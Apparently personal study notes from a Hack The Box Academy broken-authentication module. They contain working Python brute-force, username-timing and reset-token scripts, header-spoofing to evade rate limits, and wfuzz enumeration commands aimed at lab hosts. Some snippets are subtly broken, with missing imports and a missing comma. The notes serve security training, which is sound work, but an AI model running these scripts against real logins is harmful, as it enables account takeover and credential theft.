## Default Credentials
#### [Default Passwords | CIRT.net](https://www.cirt.net/passwords?criteria=cisco)
## Weak Bruteforce Protections
### CAPTCHA
### Rate Limiting
#### [rate_limit_check.py](https://academy.hackthebox.com/storage/modules/80/scripts/rate_limit_check_py.txt)
The relevant lines are 10 and 13, where we configure a wait time and a lock message, and line 41, where we do the actual check.
### Insufficient Protections
#### Methods to bypass protections:
- Modify the `User-Agent` header
- Modify IP address in `X-Forwarded-For` header
#### basic_bruteforce.py (alter headers portion)
```Python
import sys
import requests
import os.path

# define target url, change as needed
url = "http://brokenauthentication.hackthebox.eu/login.php"

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"
	"X-Forwarded-For": "1.2.3.4"
}

# define the string expected if valid account has been found. our basic PHP example replies with Welcome in case of success

valid = "Welcome"

"""
wordlist is expected as CSV with field like: Vendor,User,Password,Comment
for this test we are using SecLists' Passwords/Default-Credentials/default-passwords.csv
change this function if your wordlist has a different format
"""
def unpack(fline):
    # get user
    userid = fline.split(",")[1]

    # if pass could contain a , we should need to handle this in another way
    passwd = fline.split(",")[2]

    return userid, passwd

"""
our PHP example accepts requests via POST, and requires parameters as userid and passwd
"""
def do_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)

    return res.text

"""
if defined valid string is found in response body return True
"""
def check(haystack, needle):
    if needle in haystack:
        return True
    else:
        return False

def main():
    # check if this script has been runned with an argument, and the argument exists and is a file
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # open the file, this is our wordlist
    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            # skip line if it starts with a comment
            if fline.startswith("#"):
                continue
            # use unpack() function to extract userid and password from wordlist, removing trailing newline
            userid, passwd = unpack(fline.rstrip())

            # call do_req() to do the HTTP request
            print("[-] Checking account {} {}".format(userid, passwd))
            res = do_req(url, userid, passwd, headers)

            # call function check() to verify if HTTP response text matches our content
            if (check(res, valid)):
                print("[+] Valid account found: userid:{} passwd:{}".format(userid, passwd))

if __name__ == "__main__":
    main()
```
Can alter the headers at line 9
### Lab Question 2:
Use 127.0.0.1 as address in `X-Forwarded-For`
## Brute Forcing Usernames
### User Unknown Attack
- When a login fails and the application tells you that the username is not known
#### Use WFuzz and a reverse string match against the response text
```Shell
wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://brokenauthentication.hackthebox.eu/user_unknown.php
```
wfuzz automatically hides any response containing an "Unknown username" message
### Timing Check
- If username and password are validated separately by the application, they will return a different time
#### timing.py
```Python
import sys
import requests
import os.path

# define target url, change as needed
url = "http://brokenauthentication.hackthebox.eu/login.php"

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# define the string expected if valid account has been found. our basic PHP example replies with Welcome in case of success

valid = "Welcome"

"""
wordlist is expected as simple list, we keep this function to have it ready if needed.
for this test we are using /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
change this function if your wordlist has a different format
"""
def unpack(fline):
    userid = fline
    passwd = 'foobar'

    return userid, passwd

"""
our PHP example accepts requests via POST, and requires parameters as userid and passwd
"""
def do_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)
    print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))

    return res.text

def main():
    # check if this script has been runned with an argument, and the argument exists and is a file
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # open the file, this is our wordlist
    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            # skip line if it starts with a comment
            if fline.startswith("#"):
                continue
            # use unpack() function to extract userid and password from wordlist, removing trailing newline
            userid, passwd = unpack(fline.rstrip())

            # call do_req() to do the HTTP request
            print("[-] Checking account {} {}".format(userid, passwd))
            res = do_req(url, userid, passwd, headers)

if __name__ == "__main__":
    main()
```
#### Run timing.py
```
python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
```
### Enumerate through Password Reset
### Enumerate through Registration Form
### Predictable Usernames
### Lab Questions:
#### Question 1 wfuzz payload:
```Shell
wfuzz -c -z file,/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Invalid username" http://94.237.56.76:33323/question1/?Username=FUZZ&Password=dummypass
```
#### Question 2 - source code showed `name="wronguser"` for incorrect usernames and `name="validuser"` for actual user
![[validuser in source.png]]
#### Question 3 - used timing.py
#### Question 4 - Used intruder on the registration account to see which user was already registered
## Brute Forcing Passwords
#### Find lines have at least one uppercase character (`'[[:upper:]]'`), and then only lines that also have a lowercase one (`'[[:lower:]]'`) and with a length of 8 and 12 chars ('^.{8,12}$') using extended regular expressions (-E)
```Shell
grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$'
```
#### Password Complexity Test Table
|**Tried**|**Password**|**Lower**|**Upper**|**Digit**|**Special**|**>=8chars**|**>=20chars**|
|---|---|---|---|---|---|---|---|
|Yes/No|`qwerty`|X||||||
|Yes/No|`Qwerty`|X|X|||||
|Yes/No|`Qwerty1`|X|X|X||||
|Yes/No|`Qwertyu1`|X|X|X||X||
|Yes/No|`Qwert1!`|X|X|X|X|||
|Yes/No|`Qwerty1!`|X|X|X|X|X||
|Yes/No|`QWERTY1`||X|X||||
|Yes/No|`QWERT1!`||X|X|X|||
|Yes/No|`QWERTY1!`||X|X|X|X||
|Yes/No|`Qwerty!`|X|X||X|||
|Yes/No|`Qwertyuiop12345!@#$%`|X|X|X|X|X|X|

### Lab:
Needs a number
Does not need lowercase
Does not need minimum of 8 chars
Does not need special chars
Needs an upper case
#### Filter:
```Shell
grep -E '[0-9]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt | grep '[[:upper:]]'
```
Will show lines with at least one digit and at least one uppercase letter
## Predictable Reset Token
#### reset_token_time.py
```Python
from hashlib import md5
import requests
from sys import exit
from time import time

url = "http://127.0.0.1/reset_token_time.php"

# to have a wide window try to bruteforce starting from 120seconds ago
now        = int(time())
start_time = now - 120
fail_text  = "Wrong token"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, now + 1):
    # get token md5
    md5_token = md5(str(x).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
```
#### Brute Forcing a short token
```Shell
wfuzz -z range,00000-99999 --ss "Valid" "https://brokenauthentication.hackthebox.eu/token.php?user=admin&token=FUZZ"
```

#### There are higher chances that temporary passwords are being generated using a predictable algorithm like mt_rand(), md5(username)

```
<?php
function generate_reset_token($username) {
  $time = intval(microtime(true) * 1000);
  $token = md5($username . $time);
  return $token;
}

```

```Python
import hashlib
import time

def generate_reset_token(username):
	current_time = datetime.now() + timedelta(seconds=1) 
	current_time_milliseconds = int(current_time.timestamp() * 1000) 
	token = hashlib.md5((username + str(current_time_milliseconds)).encode()).hexdigest()
	return token

print(generate_reset_token(sys.argv[1]))
```